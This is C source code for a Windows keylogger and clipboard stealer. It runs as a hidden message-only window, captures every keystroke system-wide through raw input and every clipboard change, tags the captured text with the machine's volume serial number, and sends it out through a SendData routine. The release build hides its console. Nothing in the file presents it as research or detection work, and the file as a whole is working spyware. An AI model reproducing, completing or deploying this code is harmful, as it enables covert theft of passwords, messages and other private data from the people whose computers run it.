#include <windows.h>
#include <stdio.h>

#include "key.h"
#include "data.h"
#include "common.h"


#define VOLUME_SERIAL_CHAR_SIZE 9
#define MAX_CHAR 1024
#define CHAR_BUFFER_SIZE (MAX_CHAR * CHARSZ + CHARSZ)


VOID UpdateKeyState();
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
VOID GetVolumeSerialNumber(PCHAR ser);
VOID AppendToCharBuffer(PCHAR c);


UINT state = STATE_NONE;
CHAR volumeSerialNumber[VOLUME_SERIAL_CHAR_SIZE];
PCHAR charBuffer;


LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch(msg)
    {
        case WM_CREATE:
        {
            if (!AddClipboardFormatListener(hwnd)) { printf("Could not att clipboard format listener"); }

            RAWINPUTDEVICE rid;
            rid.usUsagePage = 0x01;
            rid.usUsage = 0x06;
            rid.dwFlags = RIDEV_INPUTSINK;
            rid.hwndTarget = hwnd;

            if (!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE))) { printf("Registering raw input device failed! \n"); }
        }
        case WM_CLIPBOARDUPDATE:
        {
            if (charBuffer == NULL)
                break;

            HANDLE h;
            if (OpenClipboard(NULL))
            {
                h = GetClipboardData(CF_TEXT);
                CloseClipboard();

                PCHAR pre = "[CLIPBOARD CHANGE (";
                PCHAR pos = ")]";
                UINT  clipBuffSize = GetLen(pre) + GetLen(pos) + GetLen((PCHAR)h) + CHARSZ;
                PCHAR clipBuff = (PCHAR)malloc(clipBuffSize);

                memset(clipBuff, 0, clipBuffSize);

                strcat_s(clipBuff, clipBuffSize, pre);
                strcat_s(clipBuff, clipBuffSize, (PCHAR)h);
                strcat_s(clipBuff, clipBuffSize, pos);

                AppendToCharBuffer(clipBuff);
                free(clipBuff);
            }

            break;
        }
        case WM_INPUT:
        {
            if (charBuffer == NULL)
                break;

            UINT dwSize;
            LPBYTE buffer;

            GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER));
            buffer = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, dwSize);

            if(GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize, sizeof(RAWINPUTHEADER)) == dwSize)
            {
                RAWINPUT* raw = (RAWINPUT*)buffer;
                if (raw->header.dwType == RIM_TYPEKEYBOARD)
                {
                    const RAWKEYBOARD rk = raw->data.keyboard;

                    USHORT MakeCode = rk.Message;
                    USHORT Flags    = rk.Flags;
                    USHORT VKey     = rk.VKey;
                    UINT   Message  = rk.Message;
                    ULONG  ExtraInf = rk.ExtraInformation;

                    if ((Flags & RI_KEY_BREAK) != 0)
                    {
                        HeapFree(GetProcessHeap(), 0, buffer);
                        break;
                    }

                    UpdateKeyState();
                    CHAR c[H_KEY_SIZE];
                    GetKeyData(c, state, MakeCode, Flags, VKey, Message, ExtraInf);
                    AppendToCharBuffer(c);
                }
            }

            HeapFree(GetProcessHeap(), 0, buffer);
            break;
        }
        case WM_DESTROY:
        {
            BOOL s = RemoveClipboardFormatListener(hwnd);
            if (!s) printf("Could not remove clipboard format listener");
        }
        default:
        {
            return DefWindowProc(hwnd, msg, wParam, lParam);
        }
    }
    return 0;
}

VOID AppendToCharBuffer(PCHAR c)
{
    if (charBuffer == NULL)
    {
        printf("charBuffer is null, cant append");
        return;
    }

    if (GetLen(c) + GetLen(charBuffer) < MAX_CHAR)
    {
        strcat_s(charBuffer, CHAR_BUFFER_SIZE, c);
    }
    else if (GetLen(c) > MAX_CHAR)
    {
        SendData(charBuffer, volumeSerialNumber);
        SendData(c, volumeSerialNumber);
        memset(charBuffer, 0, CHAR_BUFFER_SIZE);
    }
    else
    {
        SendData(charBuffer, volumeSerialNumber);
        memset(charBuffer, 0, CHAR_BUFFER_SIZE);
        strcat_s(charBuffer, CHAR_BUFFER_SIZE, c);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
#ifndef NDEBUG
    AllocConsole();
    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);
    freopen("CONIN$", "r", stdin);
#endif

    GetVolumeSerialNumber(volumeSerialNumber);

    WNDCLASSEX wc;
    HWND hwnd;
    MSG msg;

    ZeroMemory(&wc, sizeof(WNDCLASSEX));
    wc.cbSize        = sizeof(WNDCLASSEX);
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInstance;
    wc.lpszClassName = "imaclass";

    if(!RegisterClassEx(&wc))
    {
        printf("Window Registration Failed!");
        return 0;
    }

    hwnd = CreateWindowEx(0, wc.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInstance, NULL);

    if(!hwnd)
    {
        printf("Window Creation Failed!");
        return 0;
    }

    charBuffer = (PCHAR)malloc(CHAR_BUFFER_SIZE);
    memset(charBuffer, 0, CHAR_BUFFER_SIZE);

    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    free(charBuffer);
    return msg.wParam;
}

void UpdateKeyState()
{
    if ((GetAsyncKeyState(VK_SHIFT)   & 0x8000) != 0) state |= STATE_SHIFT;   else state &= ~(STATE_SHIFT);
    if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0) state |= STATE_CONTROL; else state &= ~(STATE_CONTROL);
    if ((GetAsyncKeyState(VK_MENU)    & 0x8000) != 0) state |= STATE_ALT;     else state &= ~(STATE_ALT);
    if ((GetKeyState(VK_CAPITAL)      & 0x0001) != 0) state |= STATE_CAPS;    else state &= ~(STATE_CAPS);
}

void GetVolumeSerialNumber(PCHAR ser)
{
    DWORD dw;
    if(GetVolumeInformation(NULL, NULL, 0, &dw, 0, 0, NULL, 0) == 0)
        sprintf_s(ser, VOLUME_SERIAL_CHAR_SIZE, "%08lX", 0);
    else
        sprintf_s(ser, VOLUME_SERIAL_CHAR_SIZE, "%08lX", dw);
}
